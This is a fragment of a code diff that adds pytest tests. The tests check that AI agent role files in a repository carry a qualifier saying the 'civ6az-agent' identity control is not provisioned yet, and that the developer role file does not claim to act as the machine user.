+                front.get("hooks"), sort_keys=True
+            ), f"{path.name} [{label}]: hooks differ"
+
+
+# ---------------------------------------------------------------------------
+# I-5 (final review): identity is the control only once it is provisioned
+# ---------------------------------------------------------------------------
+
+_REAL_AGENTS = sorted((REPO_ROOT / ".claude" / "agents").glob("sdlc-*.md"))
+
+
+@pytest.mark.parametrize("path", _REAL_AGENTS, ids=lambda p: p.stem)
+def test_identity_claim_carries_the_provisioning_qualifier(path: Path) -> None:
+    """Every role file that names identity as the control says it is not provisioned yet.
+
+    The rest of the docs (CLAUDE.md section 3.2, the charter, ``.claude/README.md``) carry
+    the qualifier; a role file without it tells an agent the server will reject a qa/main
+    merge or tag, which is false before the maintainer provisions ``civ6az-agent``.
+    """
+    text = path.read_text(encoding="utf-8")
+    assert "civ6az-agent" in text
+    assert "once the maintainer provisions it" in text, path.name
+    assert "until then maintainer-only is a convention" in text, path.name
+
+
+def test_developer_does_not_claim_to_act_as_the_machine_user_today() -> None:
+    text = (REPO_ROOT / ".claude" / "agents" / "sdlc-developer.md").read_text(encoding="utf-8")
+    assert "You act as the machine user" not in text
+    assert "against `dev`, as `civ6az-agent`" not in text
+    assert "the current default branch" in text
